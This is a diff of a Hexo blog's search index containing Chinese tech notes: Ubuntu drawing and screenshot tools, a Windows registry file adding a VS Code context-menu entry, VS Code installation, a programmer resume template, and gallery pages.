+        <content type="html"><![CDATA[<h2 id="ubuntu绘图程序Gnome-paint"><a href="#ubuntu绘图程序Gnome-paint" class="headerlink" title="ubuntu绘图程序Gnome-paint"></a>ubuntu绘图程序Gnome-paint</h2><p>在ubuntu下写笔记时有时会需要画图、打马，使用了Gnome-paint这个小工具。</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-paint</span><br></pre></td></tr></table></figure><p>这是一个GNOME桌面下很简单的绘图应用程序，拥有典型界面和一些其他选项。它提供了基本的功能和两个工具条：一个是用来选择工具，另一个用来选择颜色。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010416.png" alt="Screenshot from 2020-04-21 02-51-00"></p>]]></content>
       
       
       <categories>
@@ -4579,11 +4579,11 @@
     
     
     <entry>
-      <title>ubuntu绘图程序Gnome-paint</title>
-      <link href="2020/04/21/2020-04-21-ubuntu_drawing_program_Gnome-paint/"/>
-      <url>2020/04/21/2020-04-21-ubuntu_drawing_program_Gnome-paint/</url>
+      <title>ubuntu 自带截图工具screenshot</title>
+      <link href="2020/04/21/2020-04-21-ubuntu_screenshot_tool_screenshot/"/>
+      <url>2020/04/21/2020-04-21-ubuntu_screenshot_tool_screenshot/</url>
       
-        <content type="html"><![CDATA[<h2 id="ubuntu绘图程序Gnome-paint"><a href="#ubuntu绘图程序Gnome-paint" class="headerlink" title="ubuntu绘图程序Gnome-paint"></a>ubuntu绘图程序Gnome-paint</h2><p>在ubuntu下写笔记时有时会需要画图、打马，使用了Gnome-paint这个小工具。</p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-paint</span><br></pre></td></tr></table></figure><p>这是一个GNOME桌面下很简单的绘图应用程序，拥有典型界面和一些其他选项。它提供了基本的功能和两个工具条：一个是用来选择工具，另一个用来选择颜色。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010416.png" alt="Screenshot from 2020-04-21 02-51-00"></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="ubuntu-自带截图工具screenshot"><a href="#ubuntu-自带截图工具screenshot" class="headerlink" title="ubuntu 自带截图工具screenshot"></a>ubuntu 自带截图工具screenshot</h2><p> ubuntu自带的截图工具screenshot能够满足基本的截图功能，可以不必安装另外的截图软件。一般用到的截图类型有三种：全屏、当前活动窗口、自定义区域，可以在Dash home中搜索找到该应用。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010349.jpeg" alt="img"><br>截取全屏快捷键：print screen<br>截取当前窗口快捷键：alt+print screen（如果遇到无法截图的情况直接用自定义截图好了，不必纠结了）<br>自定义区域截图的快捷键需要自己设置，设置步骤如下：<br>system settings—-&gt;keyboard—–&gt;shortcuts—–&gt;custom shortcuts—–&gt;点击屏幕下方的加号,如下设置</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010353.jpeg" alt="img"></p><p>然后按下Ctrl+Alt+A(要设置的快捷键)</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010358.png" alt="image-20200422093736045"></p>]]></content>
       
       
       <categories>
@@ -4664,31 +4664,6 @@
     
     
     <entry>
-      <title>VSCODE添加右键打开文件夹功能</title>
-      <link href="2020/04/20/2020-04-20-vscode_add_right_click_menu_to_open_the_folder_with_vscode/"/>
-      <url>2020/04/20/2020-04-20-vscode_add_right_click_menu_to_open_the_folder_with_vscode/</url>
-      
-        <content type="html"><![CDATA[<p>问题描述<br>由于之前在安装VSCODE的时候，漏选了以下功能</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20190304095855861.png" alt="20190304095855861"></p><p>导致打开项目，需要先打开VSCODE，再打开文件夹。</p><p>可以后期修改注册表实现添加右键vscode打开文件夹功能。</p><p>新建文本，将以下代码写入文本，并修改文件名为Open File With VS code.reg。里面的vscode的路径要是你自己本机的vscode的路径，要记得改。运行即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%1\&quot;&quot;</span><br><span class="line">    </span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;</span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/8140656-373ca45acfaf8b68.png" alt="8140656-373ca45acfaf8b68"></p><p>点击确定，即可右键添加vscode打开文件夹。<br><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vscode_open_folder.png" alt="vscode_open_folder"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> others </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> vscode </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>bootstrap-table 点击表格某一行内容跳转到该行内容的详情页</title>
       <link href="2020/04/20/2020-04-20-bootstrap-table_click_on_row_to%20jump_to_detail_page/"/>
       <url>2020/04/20/2020-04-20-bootstrap-table_click_on_row_to%20jump_to_detail_page/</url>
@@ -4708,6 +4683,31 @@
             <tag> web </tag>
             
             <tag> bootstrap-table </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>VSCODE添加右键打开文件夹功能</title>
+      <link href="2020/04/20/2020-04-20-vscode_add_right_click_menu_to_open_the_folder_with_vscode/"/>
+      <url>2020/04/20/2020-04-20-vscode_add_right_click_menu_to_open_the_folder_with_vscode/</url>
+      
+        <content type="html"><![CDATA[<p>问题描述<br>由于之前在安装VSCODE的时候，漏选了以下功能</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20190304095855861.png" alt="20190304095855861"></p><p>导致打开项目，需要先打开VSCODE，再打开文件夹。</p><p>可以后期修改注册表实现添加右键vscode打开文件夹功能。</p><p>新建文本，将以下代码写入文本，并修改文件名为Open File With VS code.reg。里面的vscode的路径要是你自己本机的vscode的路径，要记得改。运行即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%1\&quot;&quot;</span><br><span class="line">    </span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;</span><br><span class="line"></span><br><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode]</span><br><span class="line">@&#x3D;&quot;Open with Code&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode\command]</span><br><span class="line">@&#x3D;&quot;\&quot;D:\\Program Files\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/8140656-373ca45acfaf8b68.png" alt="8140656-373ca45acfaf8b68"></p><p>点击确定，即可右键添加vscode打开文件夹。<br><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vscode_open_folder.png" alt="vscode_open_folder"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> others </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vscode </tag>
             
         </tags>
       
@@ -5486,7 +5486,7 @@
       <link href="2020/04/02/2020-04-02-programmer_resume/"/>
       <url>2020/04/02/2020-04-02-programmer_resume/</url>
       
-        <content type="html"><![CDATA[<h2 id="技术简历编写"><a href="#技术简历编写" class="headerlink" title="技术简历编写"></a>技术简历编写</h2><p>模板来源自<a href="http://cv.ftqq.com/">http://cv.ftqq.com</a></p><h1 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h1><p>（HR会打印你的简历，用于在面试的时候联系，所以联系方式放到最上边会比较方便）</p><ul><li>手机：135…. （如果是外地手机，可注明。如经常关机，要写上最优联系时间）</li><li>Email：<a href="mailto:&#103;&#111;&#x6f;&#x64;&#109;&#x61;&#110;&#x40;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#111;&#x6f;&#x64;&#109;&#x61;&#110;&#x40;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a> （虽然我觉得QQ邮箱无所谓，不过有些技术人员比较反感，建议用G，非要用的话，不要用数字邮箱名）</li><li>QQ/微信号：6…（提供一个通过网络可以联系到你的方式）</li></ul><h1 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h1><ul><li><p>冷熊/男/1990 </p></li><li><p>本科/北极大学计算机系 </p></li><li><p>工作年限：3年</p></li><li><p>微博：<a href="http://weibo.com/easy">@Easy</a> （如果没有技术相关内容，也可以不放）</p></li><li><p>技术博客：<a href="http://old.ftqq.com/">http://old.ftqq.com</a> ( 使用GitHub Host的Big较高  )</p></li><li><p>Github：<a href="http://github.com/easychen">http://github.com/easychen</a> ( 有原创repo的Github帐号会极大的提升你的个人品牌  )</p></li><li><p>期望职位：PHP高级程序员，应用架构师</p></li><li><p>期望薪资：税前月薪15k~20k，特别喜欢的公司可例外</p></li><li><p>期望城市：北京</p></li></ul><h1 id="工作经历"><a href="#工作经历" class="headerlink" title="工作经历"></a>工作经历</h1><p>（工作经历按逆序排列，最新的在最前边，按公司做一级分组，公司内按二级分组）</p><h2 id="ABC公司-（-2012年9月-2014年9月-）"><a href="#ABC公司-（-2012年9月-2014年9月-）" class="headerlink" title="ABC公司 （ 2012年9月 ~ 2014年9月 ）"></a>ABC公司 （ 2012年9月 ~ 2014年9月 ）</h2><h3 id="DEF项目"><a href="#DEF项目" class="headerlink" title="DEF项目"></a>DEF项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="GHI项目"><a href="#GHI项目" class="headerlink" title="GHI项目"></a>GHI项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="其他项目"><a href="#其他项目" class="headerlink" title="其他项目"></a>其他项目</h3><p>（每个公司写2~3个核心项目就好了，如果你有非常大量的项目，那么按分类进行合并，每一类选一个典型写出来。其他的一笔带过即可。）</p><h2 id="JKL公司-（-2010年3月-2012年8月-）"><a href="#JKL公司-（-2010年3月-2012年8月-）" class="headerlink" title="JKL公司 （ 2010年3月 ~ 2012年8月 ）"></a>JKL公司 （ 2010年3月 ~ 2012年8月 ）</h2><h3 id="MNO项目"><a href="#MNO项目" class="headerlink" title="MNO项目"></a>MNO项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="PQR项目"><a href="#PQR项目" class="headerlink" title="PQR项目"></a>PQR项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="其他项目-1"><a href="#其他项目-1" class="headerlink" title="其他项目"></a>其他项目</h3><p>（每个公司写2~3个核心项目就好了，如果你有非常大量的项目，那么按分类进行合并，每一类选一个典型写出来。其他的一笔带过即可。）</p><h1 id="开源项目和作品"><a href="#开源项目和作品" class="headerlink" title="开源项目和作品"></a>开源项目和作品</h1><p>（这一段用于放置工作以外的、可证明你的能力的材料）</p><h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><p>（对于程序员来讲，没有什么比Show me the code能有说服力了）</p><ul><li><a href="http://github.com/yourname/projectname">STU</a>：项目的简要说明，Star和Fork数多的可以注明</li><li><a href="http://github.com/yourname/projectname">WXYZ</a>：项目的简要说明，Star和Fork数多的可以注明</li></ul><h2 id="技术文章"><a href="#技术文章" class="headerlink" title="技术文章"></a>技术文章</h2><p>（挑选你写作或翻译的技术文章，好的文章可以从侧面证实你的表达和沟通能力，也帮助招聘方更了解你）</p><ul><li><a href="http://get.jobdeer.com/706.get">一个产品经理眼中的云计算：前生今世和未来</a></li><li><a href="http://get.jobdeer.com/343.get">来自HeroKu的HTTP API 设计指南(翻译文章)</a> （ 好的翻译文章可以侧证你对英文技术文档的阅读能力）</li></ul><h2 id="演讲和讲义"><a href="#演讲和讲义" class="headerlink" title="演讲和讲义"></a>演讲和讲义</h2><p>（放置你代表公司在一些技术会议上做过的演讲，以及你在公司分享时制作的讲义）</p><ul><li>2014架构师大会演讲：<a href="http://ftqq.com/">如何通过Docker优化内部开发</a></li><li>9月公司内部分享：<a href="http://ftqq.com/">云计算的前生今世</a></li></ul><h1 id="技能清单"><a href="#技能清单" class="headerlink" title="技能清单"></a>技能清单</h1><p>（我一般主张将技能清单写入到工作经历里边去。不过很难完整，所以有这么一段也不错）</p><p>以下均为我熟练使用的技能</p><ul><li>Web开发：PHP/Hack/Node</li><li>Web框架：ThinkPHP/Yaf/Yii/Lavarel/LazyPHP</li><li>前端框架：Bootstrap/AngularJS/EmberJS/HTML5/Cocos2dJS/ionic</li><li>前端工具：Bower/Gulp/SaSS/LeSS/PhoneGap</li><li>数据库相关：MySQL/PgSQL/PDO/SQLite</li><li>版本管理、文档和自动化部署工具：Svn/Git/PHPDoc/Phing/Composer</li><li>单元测试：PHPUnit/SimpleTest/Qunit</li><li>云和开放平台：SAE/BAE/AWS/微博开放平台/微信应用开发</li></ul><hr><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>感谢您花时间阅读我的简历，期待能有机会和您共事。</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="技术简历编写"><a href="#技术简历编写" class="headerlink" title="技术简历编写"></a>技术简历编写</h2><p>模板来源自<a href="http://cv.ftqq.com/">http://cv.ftqq.com</a></p><h1 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h1><p>（HR会打印你的简历，用于在面试的时候联系，所以联系方式放到最上边会比较方便）</p><ul><li>手机：135…. （如果是外地手机，可注明。如经常关机，要写上最优联系时间）</li><li>Email：<a href="mailto:&#103;&#111;&#111;&#100;&#x6d;&#97;&#x6e;&#x40;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;">&#103;&#111;&#111;&#100;&#x6d;&#97;&#x6e;&#x40;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;</a> （虽然我觉得QQ邮箱无所谓，不过有些技术人员比较反感，建议用G，非要用的话，不要用数字邮箱名）</li><li>QQ/微信号：6…（提供一个通过网络可以联系到你的方式）</li></ul><h1 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h1><ul><li><p>冷熊/男/1990 </p></li><li><p>本科/北极大学计算机系 </p></li><li><p>工作年限：3年</p></li><li><p>微博：<a href="http://weibo.com/easy">@Easy</a> （如果没有技术相关内容，也可以不放）</p></li><li><p>技术博客：<a href="http://old.ftqq.com/">http://old.ftqq.com</a> ( 使用GitHub Host的Big较高  )</p></li><li><p>Github：<a href="http://github.com/easychen">http://github.com/easychen</a> ( 有原创repo的Github帐号会极大的提升你的个人品牌  )</p></li><li><p>期望职位：PHP高级程序员，应用架构师</p></li><li><p>期望薪资：税前月薪15k~20k，特别喜欢的公司可例外</p></li><li><p>期望城市：北京</p></li></ul><h1 id="工作经历"><a href="#工作经历" class="headerlink" title="工作经历"></a>工作经历</h1><p>（工作经历按逆序排列，最新的在最前边，按公司做一级分组，公司内按二级分组）</p><h2 id="ABC公司-（-2012年9月-2014年9月-）"><a href="#ABC公司-（-2012年9月-2014年9月-）" class="headerlink" title="ABC公司 （ 2012年9月 ~ 2014年9月 ）"></a>ABC公司 （ 2012年9月 ~ 2014年9月 ）</h2><h3 id="DEF项目"><a href="#DEF项目" class="headerlink" title="DEF项目"></a>DEF项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="GHI项目"><a href="#GHI项目" class="headerlink" title="GHI项目"></a>GHI项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="其他项目"><a href="#其他项目" class="headerlink" title="其他项目"></a>其他项目</h3><p>（每个公司写2~3个核心项目就好了，如果你有非常大量的项目，那么按分类进行合并，每一类选一个典型写出来。其他的一笔带过即可。）</p><h2 id="JKL公司-（-2010年3月-2012年8月-）"><a href="#JKL公司-（-2010年3月-2012年8月-）" class="headerlink" title="JKL公司 （ 2010年3月 ~ 2012年8月 ）"></a>JKL公司 （ 2010年3月 ~ 2012年8月 ）</h2><h3 id="MNO项目"><a href="#MNO项目" class="headerlink" title="MNO项目"></a>MNO项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="PQR项目"><a href="#PQR项目" class="headerlink" title="PQR项目"></a>PQR项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="其他项目-1"><a href="#其他项目-1" class="headerlink" title="其他项目"></a>其他项目</h3><p>（每个公司写2~3个核心项目就好了，如果你有非常大量的项目，那么按分类进行合并，每一类选一个典型写出来。其他的一笔带过即可。）</p><h1 id="开源项目和作品"><a href="#开源项目和作品" class="headerlink" title="开源项目和作品"></a>开源项目和作品</h1><p>（这一段用于放置工作以外的、可证明你的能力的材料）</p><h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><p>（对于程序员来讲，没有什么比Show me the code能有说服力了）</p><ul><li><a href="http://github.com/yourname/projectname">STU</a>：项目的简要说明，Star和Fork数多的可以注明</li><li><a href="http://github.com/yourname/projectname">WXYZ</a>：项目的简要说明，Star和Fork数多的可以注明</li></ul><h2 id="技术文章"><a href="#技术文章" class="headerlink" title="技术文章"></a>技术文章</h2><p>（挑选你写作或翻译的技术文章，好的文章可以从侧面证实你的表达和沟通能力，也帮助招聘方更了解你）</p><ul><li><a href="http://get.jobdeer.com/706.get">一个产品经理眼中的云计算：前生今世和未来</a></li><li><a href="http://get.jobdeer.com/343.get">来自HeroKu的HTTP API 设计指南(翻译文章)</a> （ 好的翻译文章可以侧证你对英文技术文档的阅读能力）</li></ul><h2 id="演讲和讲义"><a href="#演讲和讲义" class="headerlink" title="演讲和讲义"></a>演讲和讲义</h2><p>（放置你代表公司在一些技术会议上做过的演讲，以及你在公司分享时制作的讲义）</p><ul><li>2014架构师大会演讲：<a href="http://ftqq.com/">如何通过Docker优化内部开发</a></li><li>9月公司内部分享：<a href="http://ftqq.com/">云计算的前生今世</a></li></ul><h1 id="技能清单"><a href="#技能清单" class="headerlink" title="技能清单"></a>技能清单</h1><p>（我一般主张将技能清单写入到工作经历里边去。不过很难完整，所以有这么一段也不错）</p><p>以下均为我熟练使用的技能</p><ul><li>Web开发：PHP/Hack/Node</li><li>Web框架：ThinkPHP/Yaf/Yii/Lavarel/LazyPHP</li><li>前端框架：Bootstrap/AngularJS/EmberJS/HTML5/Cocos2dJS/ionic</li><li>前端工具：Bower/Gulp/SaSS/LeSS/PhoneGap</li><li>数据库相关：MySQL/PgSQL/PDO/SQLite</li><li>版本管理、文档和自动化部署工具：Svn/Git/PHPDoc/Phing/Composer</li><li>单元测试：PHPUnit/SimpleTest/Qunit</li><li>云和开放平台：SAE/BAE/AWS/微博开放平台/微信应用开发</li></ul><hr><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>感谢您花时间阅读我的简历，期待能有机会和您共事。</p>]]></content>
       
       
       <categories>
@@ -5877,9 +5877,9 @@
             
             <tag> python </tag>
             
-            <tag> 正文提取 </tag>
-            
             <tag> goose </tag>
+            
+            <tag> 正文提取 </tag>
             
         </tags>
       
@@ -6027,31 +6027,6 @@
     
     
     <entry>
-      <title>linux 安装 vscode</title>
-      <link href="2020/03/19/2020-03-19-linux_install_vscode/"/>
-      <url>2020/03/19/2020-03-19-linux_install_vscode/</url>
-      
-        <content type="html"><![CDATA[<p>从vscode官网下载最新版本，deb包下载地址：</p><p><a href="https://code.visualstudio.com/docs?dv=linux64">https://code.visualstudio.com/docs?dv=linux64</a></p><p>dpkg -i 安装包</p><p>安装成功后，执行code命令打开vscode界面</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> linux </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> vscode </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>CTF攻防世界 web新手题</title>
       <link href="2020/03/19/2020-03-19-CTF_world_web_rookie/"/>
       <url>2020/03/19/2020-03-19-CTF_world_web_rookie/</url>
@@ -6100,6 +6075,31 @@
     
     
     <entry>
+      <title>linux 安装 vscode</title>
+      <link href="2020/03/19/2020-03-19-linux_install_vscode/"/>
+      <url>2020/03/19/2020-03-19-linux_install_vscode/</url>
+      
+        <content type="html"><![CDATA[<p>从vscode官网下载最新版本，deb包下载地址：</p><p><a href="https://code.visualstudio.com/docs?dv=linux64">https://code.visualstudio.com/docs?dv=linux64</a></p><p>dpkg -i 安装包</p><p>安装成功后，执行code命令打开vscode界面</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vscode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>为什么写作</title>
       <link href="2020/03/18/2020-03-18-why_write/"/>
       <url>2020/03/18/2020-03-18-why_write/</url>
@@ -6133,9 +6133,20 @@
     
     
     <entry>
-      <title>gallery</title>
-      <link href="gallery/index.html"/>
-      <url>gallery/index.html</url>
+      <title>分类</title>
+      <link href="categories/index.html"/>
+      <url>categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>留言</title>
+      <link href="contact/index.html"/>
+      <url>contact/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -6155,20 +6166,9 @@
     
     
     <entry>
-      <title>分类</title>
-      <link href="categories/index.html"/>
-      <url>categories/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>留言</title>
-      <link href="contact/index.html"/>
-      <url>contact/index.html</url>
+      <title>gallery</title>
+      <link href="gallery/index.html"/>
+      <url>gallery/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -6199,6 +6199,17 @@
     
     
     <entry>
+      <title>影片</title>
+      <link href="movies/index.html"/>
+      <url>movies/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>音乐</title>
       <link href="music/index.html"/>
       <url>music/index.html</url>
@@ -6221,11 +6232,11 @@
     
     
     <entry>
-      <title>影片</title>
-      <link href="movies/index.html"/>
-      <url>movies/index.html</url>
+      <title>峨眉山之行</title>
+      <link href="gallery/wallpaper/index.html"/>
+      <url>gallery/wallpaper/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<div class="justified-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg"><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg"><br><img src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg"><br><img src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg"><br><img src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg"><br><img src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg"><br><img src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg"><br><img src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg"></p>          </div>]]></content>
       
     </entry>
     
@@ -6235,17 +6246,6 @@
       <title></title>
       <link href="gallery/marvel/index.html"/>
       <url>gallery/marvel/index.html</url>
-      
